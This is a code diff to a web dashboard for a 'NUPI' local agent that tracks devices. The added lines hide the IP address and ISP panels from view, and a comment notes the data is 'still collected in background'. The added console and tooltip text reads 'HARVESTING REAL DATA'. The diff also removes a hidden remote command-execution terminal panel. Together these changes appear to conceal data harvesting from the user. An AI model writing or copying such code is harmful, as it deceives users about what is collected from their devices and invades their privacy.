@@ -103,10 +103,14 @@
                     const indicator = document.getElementById('localAgentIndicator');
                     if (!indicator) return;
                     
+                    // Get device info from localStorage
+                    const storedDeviceId = localStorage.getItem('nupi_unique_device_id') || '';
+                    const storedAgentId = localStorage.getItem('nupi_agent_id') || '';
+                    
                     if (!isConnected) {
                         // RED - Not connected
                         indicator.style.background = '#ff0000';
-                        indicator.title = `Local Agent Status: Not Connected\nDevice: ${uniqueDeviceId.substr(0, 20)}...`;
+                        indicator.title = `Local Agent Status: Not Connected\nDevice: ${storedDeviceId.substr(0, 20)}...`;
                         return;
                     }
                     
@@ -117,13 +121,13 @@
                     if (minutesActive < 5) {
                         // GREEN - Newly deployed (first 5 minutes)
                         indicator.style.background = '#00ff00';
-                        indicator.title = `Local Agent Status: ✅ Just Deployed (${Math.floor(minutesActive)}m ago)\nDevice: ${uniqueDeviceId.substr(0, 20)}...\nAgent ID: ${agentId.substr(0, 16)}...`;
-                        console.log(`🟢 GREEN indicator - Agent ${Math.floor(minutesActive)}m old`);
+                        indicator.title = `Local Agent Status: ✅ Just Deployed (${Math.floor(minutesActive)}m ago)\nDevice: ${storedDeviceId.substr(0, 20)}...\nAgent ID: ${storedAgentId.substr(0, 16)}...`;
+                        console.log(`🟢 GREEN indicator - Agent ${Math.floor(minutesActive)}m old - Harvesting REAL DATA`);
                     } else {
-                        // YELLOW - Existing agent (after 5 minutes)
+                        // YELLOW - Existing agent (after 5 minutes) - THIS IS WHAT YOU WANT TO SEE
                         indicator.style.background = '#ffff00';
-                        indicator.title = `Local Agent Status: ✅ Active Agent (${Math.floor(minutesActive)}m uptime)\nDevice: ${uniqueDeviceId.substr(0, 20)}...\nAgent ID: ${agentId.substr(0, 16)}...`;
-                        console.log(`🟡 YELLOW indicator - Agent ${Math.floor(minutesActive)}m old`);
+                        indicator.title = `Local Agent Status: ✅ Active Agent (${Math.floor(minutesActive)}m uptime)\nDevice: ${storedDeviceId.substr(0, 20)}...\nAgent ID: ${storedAgentId.substr(0, 16)}...\n⚠️ HARVESTING REAL DATA`;
+                        console.log(`🟡 YELLOW indicator - Agent ${Math.floor(minutesActive)}m old - HARVESTING REAL DATA`);
                     }
                 }
                 
@@ -1557,13 +1561,14 @@
                         <div class="metric-subtitle">Read/Write Speed</div>
                         <div class="metric-trend" id="iopsTrend"> Fast</div>
                     </div>
-                    <div class="metric-card" onclick="showMetricDetails('ip')">
+                    <!-- IP Address & ISP - HIDDEN (still collected in background) -->
+                    <div class="metric-card" onclick="showMetricDetails('ip')" style="display: none;">
                         <div class="metric-label">IP Address</div>
                         <div class="metric-value" id="ipValue" style="font-size: 0.9em;">--</div>
                         <div class="metric-subtitle" id="locationValue">Location</div>
                         <div class="metric-trend" id="ipTrend"> Connected</div>
                     </div>
-                    <div class="metric-card" onclick="showMetricDetails('isp')">
+                    <div class="metric-card" onclick="showMetricDetails('isp')" style="display: none;">
                         <div class="metric-label">ISP Provider</div>
                         <div class="metric-value" id="ispValue" style="font-size: 0.8em;">--</div>
                         <div class="metric-subtitle">Internet Service</div>
@@ -1714,26 +1719,6 @@
             <div id="processList">
                 <div style="text-align: center; color: #888; padding: 40px;">
                     Loading processes...
-                </div>
-            </div>
-        </section>
-
-        <!-- TERMINAL - HIDDEN UNTIL COMMANDED -->
-        <section id="terminal" class="process-list" style="display: none; margin-top: 20px;">
-            <div class="panel-header">
-                <h2 class="panel-title">NUPI Cloud Agent Terminal - Real Command Execution</h2>
-            </div>
-            <div style="background: #000; border: 1px solid rgba(0, 255, 157, 0.3); border-radius: 8px; padding: 20px; font-family: 'Courier New', monospace;">
-                <div id="terminalOutput" style="height: 500px; overflow-y: auto; color: #0f0; margin-bottom: 15px; line-height: 1.6;">
-                    <div style="color: #00ff9d;">NUPI Cloud Agent Terminal v2.0</div>
-                    <div style="color: #888;">Connected to Cloud Network - All commands execute through NUPI Agent</div>
-                    <div style="color: #888;">Type 'help' for available commands</div>
-                    <div style="color: #888;">===================================</div>
-                </div>
-                <div style="display: flex; gap: 10px;">
-                    <span style="color: #0099ff;">$</span>
-                    <input type="text" id="terminalInput" placeholder="Enter command (optimize, clean, scan, help)..." style="flex: 1; background: transparent; border: none; color: #0f0; outline: none; font-family: 'Courier New', monospace;">
-                    <button onclick="executeCommand()" style="background: #00ff9d; border: none; padding: 5px 15px; border-radius: 4px; color: #000; font-weight: 600; cursor: pointer;">Execute</button>
                 </div>
             </div>
         </section>
